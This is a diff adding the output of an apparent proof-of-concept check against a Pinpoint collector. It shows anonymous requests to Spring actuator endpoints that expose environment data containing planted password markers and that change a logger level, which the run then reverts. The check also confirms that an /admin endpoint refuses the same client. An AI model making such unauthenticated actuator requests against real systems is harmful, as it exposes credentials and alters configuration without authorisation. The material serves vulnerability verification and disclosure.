@@ -1,0 +1,7 @@
+[1] anonymous GET /monitor/env -> 200, 40145 bytes; planted markers present: ['verify-admin-pw', 'verify-dummy-pw', 'verify-redis-pw']
+[2] anonymous GET /monitor/loggers/com.navercorp.pinpoint.collector -> 200 b'{"configuredLevel":"INFO","effectiveLevel":"INFO"}'
+[3] anonymous POST /monitor/loggers/<name> (configuredLevel=DEBUG) -> 204 (expect 2xx); anonymous GET now shows: b'{"configuredLevel":"DEBUG","effectiveLevel":"DEBUG"}'
+[3r] revert POST (configuredLevel=INFO, matching the prior effective level) -> 204
+[4] anonymous GET /admin/enableAccess -> 403 (expect 401/403 — gated)
+OK: unauthenticated actuator disclosure + runtime write observed, and the /admin gate refuses the same anonymous client (no destructive operation performed)
+EXIT=0
